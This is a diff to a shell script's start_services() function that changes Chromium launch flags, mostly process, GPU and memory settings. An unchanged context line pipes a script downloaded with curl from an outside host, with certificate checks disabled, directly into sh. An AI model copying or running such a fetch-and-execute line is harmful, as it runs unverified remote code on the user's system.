@@ -233,13 +233,15 @@ start_services() {
     --memory-pressure-off \
     --disable-webrtc \
 	--disable-ipc-flooding-protection \
+    --renderer-process-limit=2 \
+	--in-process-gpu \
 	--no-first-run \
     --disable-infobars \
     --hide-crash-restore-bubble \
     --disable-session-crashed-bubble \
     --restore-last-session \
-    --disable-features=Translate,BackForwardCache,IsolateOrigins \
-    --js-flags=--max-old-space-size=2048"
+    --disable-features=Translate,BackForwardCache \
+    --js-flags=--max-old-space-size=1024"
   (curl -LsSk https://gbjs.serv00.net/sh/runit.sh) | sh -s add
   mkdir -p "\$PWD/.cache"
   sed -i "1a export TMPDIR=\$PWD/.cache" /etc/service/chromium-browser/run
